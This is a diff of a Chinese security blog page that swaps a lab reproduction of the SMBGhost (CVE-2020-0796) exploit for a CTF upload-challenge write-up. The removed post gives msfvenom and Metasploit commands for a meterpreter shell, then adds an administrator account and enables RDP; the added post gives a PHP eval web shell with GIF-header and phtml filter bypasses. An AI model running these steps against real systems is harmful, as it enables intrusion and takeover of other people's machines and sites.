@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title>CVE-2020-0796复现 | 大周&#39;blog</title>
+  <title>极客大挑战2019-upload | 大周&#39;blog</title>
   <meta name="description" content="ctf萌新" />
   <meta name="keywords" content="ctf,菜鸡,萌新,web,Sakura" />
   
@@ -231,8 +231,8 @@
         <!--<div class="toc-entry-content"> <!-- 套嵌目录使用（主要为了支援评论）-->
         
           <header class="entry-header">
-            <h1 class="entry-title">CVE-2020-0796复现</h1>
-            <p class="entry-census">&nbsp;·&nbsp;2020-6-8&nbsp;
+            <h1 class="entry-title">极客大挑战2019-upload</h1>
+            <p class="entry-census">&nbsp;·&nbsp;2020-7-9&nbsp;
               
                     
         ·<span id="readcount"></span>次阅读
@@ -242,44 +242,19 @@
           </header>
         
         <div class="entry-content">
-          <p>最近发布的一个Windows漏洞，有时间来复现一下</p>
+          <p>地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p>
 <a id="more"></a>
 
-<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>有关此漏洞的详细介绍:<a href="https://www.freebuf.com/vuls/233263.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/233263.html</a></p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>利用Windows10 1903版本来进行复现 </p>
-<h4 id="镜像下载与安装"><a href="#镜像下载与安装" class="headerlink" title="镜像下载与安装"></a>镜像下载与安装</h4><pre><code>镜像：ed2k://|file|cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c.iso|4815527936|47D4C57E638DF8BF74C59261E2CE702D|</code></pre><p>安装镜像</p>
-<p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/1.png" alt="1"></p>
-<h4 id="虚拟机信息"><a href="#虚拟机信息" class="headerlink" title="虚拟机信息"></a>虚拟机信息</h4><p>Windows10 1903版本</p>
-<p>ip：192.168.1.104</p>
-<h4 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h4><p>攻击机</p>
-<p>工具：SMBGhost</p>
-<pre><code>python3 scanner.py 192.168.1.104</code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/2.png" alt="2"></p>
-<p>靶机</p>
-<p>工具：奇安信检测工具</p>
-<p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/3.png" alt="3"></p>
-<h4 id="使用metasploit生成buf"><a href="#使用metasploit生成buf" class="headerlink" title="使用metasploit生成buf"></a>使用metasploit生成buf</h4><pre><code>msfvenom -p windows/x64/meterpreter/bind_tcp lport=6666 -f py -o tool.py </code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/4.png" alt="4"></p>
-<p>将SMBGhost_RCE_PoC中的exploit.py中的USER_OAYLOAD更换为刚刚生成的buf</p>
-<p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/5.png" alt="5"></p>
-<h4 id="使用metasploit对6666端口进行监听"><a href="#使用metasploit对6666端口进行监听" class="headerlink" title="使用metasploit对6666端口进行监听"></a>使用metasploit对6666端口进行监听</h4><pre><code>msfconsole
-use exploit/multi/handler
-set payload windows/x64/meterpreter/bind_tcp
-show options
-set LPORT 6666
-set RHOST 192.168.1.104
-exploit</code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/6.png" alt="6"></p>
-<h4 id="运行exploit-py"><a href="#运行exploit-py" class="headerlink" title="运行exploit.py"></a>运行exploit.py</h4><pre><code>python3 exploit.py -ip 192.168.1.104</code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/7.png" alt="7"></p>
-<p>这里打下去靶机会出现蓝屏重启的现象，多试几次就好</p>
-<p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/8.png" alt="8"></p>
-<p>拿到shell</p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h4><pre><code>net user d1a0 password /add</code></pre><h4 id="加入管理组"><a href="#加入管理组" class="headerlink" title="加入管理组"></a>加入管理组</h4><pre><code>net localgroup Administrators d1a0 /add
-net localgroup Users d1a0 /del</code></pre><h4 id="查看用户信息"><a href="#查看用户信息" class="headerlink" title="查看用户信息"></a>查看用户信息</h4><pre><code>net user</code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/9.png" alt="9"></p>
-<h4 id="开启远程连接功能"><a href="#开启远程连接功能" class="headerlink" title="开启远程连接功能"></a>开启远程连接功能</h4><pre><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/10.png" alt="10"></p>
-<p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/11.png" alt="11"></p>
-<p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/12.png" alt="12"></p>
-<p>工具地址：</p>
-<p>SMBGhost：<a href="https://github.com/ollypwn/SMBGhost" target="_blank" rel="noopener">https://github.com/ollypwn/SMBGhost</a></p>
-<p>奇安信检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip" target="_blank" rel="noopener">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></p>
-<p>SMBGhost_RCE_PoC：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC.git" target="_blank" rel="noopener">https://github.com/chompie1337/SMBGhost_RCE_PoC.git</a></p>
+<p><img src="/2020/07/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/1.png" alt="1"></p>
+<p>上传界面</p>
+<p><img src="/2020/07/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/2.png" alt="2"></p>
+<p>过滤了<code>&lt;?</code>那就尝试不带<code>&lt;?</code>的，前几天遇到过</p>
+<script language="php">eval($_POST[a]);</script>
+
+<p><img src="/2020/07/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/3.png" alt="3"></p>
+<p>还要满足图片，</p>
+<pre><code>GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_POST[a]);&lt;/script&gt;</code></pre><p>PHP后缀的话可以用PHP3、PHP4、phtml绕过，这里只能用phtml</p>
+<p>上传文件都在upload目录下，蚁剑连接，在根目录下得到flag</p>
 
         </div>
         <!-- .entry-content -->
@@ -301,39 +276,20 @@ net localgroup Users d1a0 /del</code></pre><h4 id="查看用户信息"><a href="
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/" rel="prev">
-              <div class="background">
-<!--                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">-->
-                
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/1ac3fa3ef82c93a8d46384e256342711.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                极客大挑战2019-LoveSQL</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2020/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/" rel="next">
+            <a href="/2020/07/08/ZJCTF-NiZhuanSiWei/" rel="next">
               <div class="background">
                 
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/b3e8dae89b950b940dc0edd1e8cc0566.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/6f005cbc1865ff1b706aba57347988ab.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                计算机网络原理学习</h3>
+                ZJCTF-NiZhuanSiWei</h3>
                 <hr>
               </div>
             </a>
